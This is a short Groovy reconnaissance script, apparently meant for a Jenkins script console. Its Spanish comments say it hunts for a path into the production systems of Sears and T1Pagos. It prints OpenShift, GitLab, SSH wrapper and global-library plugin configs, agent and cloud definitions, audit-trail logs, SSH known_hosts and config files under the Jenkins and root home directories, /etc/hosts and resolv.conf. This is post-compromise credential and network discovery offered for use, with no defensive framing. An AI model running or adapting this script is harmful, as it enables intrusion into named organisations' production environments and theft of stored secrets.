// Lee configs críticos: OpenShift, proxy, global Jenkins config
// Busca la ruta a PROD Sears y T1Pagos

println "=== OPENSHIFT PLUGIN CONFIG ==="
def osConf = new File("/var/jenkins_home/com.openshift.jenkins.plugins.OpenShift.xml")
if (osConf.exists()) println osConf.text

println "\n=== PROXY CONFIG ==="
def proxyConf = new File("/var/jenkins_home/proxy.xml")
if (proxyConf.exists()) println proxyConf.text

println "\n=== GLOBAL JENKINS CONFIG (config.xml) excerpts ==="
def globalConf = new File("/var/jenkins_home/config.xml")
if (globalConf.exists()) {
    def content = globalConf.text
    // Get slaves/agents section
    println "--- Agents/Slaves section ---"
    def agentSection = (content =~ /(?s)<slave>.*?<\/slave>/)
    agentSection.each { m -> println m[0] }
    
    // Also get cloud section
    println "--- Clouds section ---"
    def cloudSection = (content =~ /(?s)<clouds>.*?<\/clouds>/)
    cloudSection.each { m -> println m[0].take(5000) }
}

println "\n=== OPENSHIFTSYNC GLOBAL PLUGIN CONFIG ==="
def syncConf = new File("/var/jenkins_home/io.fabric8.jenkins.openshiftsync.GlobalPluginConfiguration.xml")
if (syncConf.exists()) println syncConf.text

println "\n=== OPENSHIFT DEPLOY APPLICATION ==="
def deployConf = new File("/var/jenkins_home/org.jenkinsci.plugins.openshift.DeployApplication.xml")
if (deployConf.exists()) println deployConf.text

println "\n=== GITLAB CONNECTION CONFIG ==="
def gitlabConf = new File("/var/jenkins_home/com.dabsquared.gitlabjenkins.connection.GitLabConnectionConfig.xml")
if (gitlabConf.exists()) println gitlabConf.text

println "\n=== GLOBAL LIBRARIES ==="
def libsConf = new File("/var/jenkins_home/org.jenkinsci.plugins.workflow.libs.GlobalLibraries.xml")
if (libsConf.exists()) println libsConf.text

println "\n=== SSH BUILD WRAPPER ==="
def sshWrapper = new File("/var/jenkins_home/org.jvnet.hudson.plugins.SSHBuildWrapper.xml")
if (sshWrapper.exists()) println sshWrapper.text

println "\n=== AUDIT TRAIL (recent commands) ==="
def auditConf = new File("/var/jenkins_home/audit-trail.xml")
if (auditConf.exists()) println auditConf.text

// Check for audit trail log files
def logsDir = new File("/var/jenkins_home/logs")
if (logsDir.exists()) {
    println "\n=== AUDIT LOGS ==="
    logsDir.eachFile { f ->
        if (f.name.contains("audit") || f.name.contains("jenkins")) {
            println "LOG: ${f.name} (${f.length()} bytes)"
            println f.text.take(2000)
        }
    }
}

println "\n=== KNOWN HOSTS / SSH CONFIGS ==="
["/var/jenkins_home/.ssh/known_hosts",
 "/var/jenkins_home/.ssh/config",
 "/root/.ssh/known_hosts",
 "/root/.ssh/config"].each { p ->
    def f = new File(p)
    if (f.exists()) {
        println "=== ${p} ==="
        println f.text.take(3000)
    }
}

println "\n=== NETWORK - HOSTS FILE ==="
def hosts = new File("/etc/hosts")
if (hosts.exists()) println hosts.text

println "\n=== RESOLV.CONF ==="
def resolv = new File("/etc/resolv.conf")
if (resolv.exists()) println resolv.text
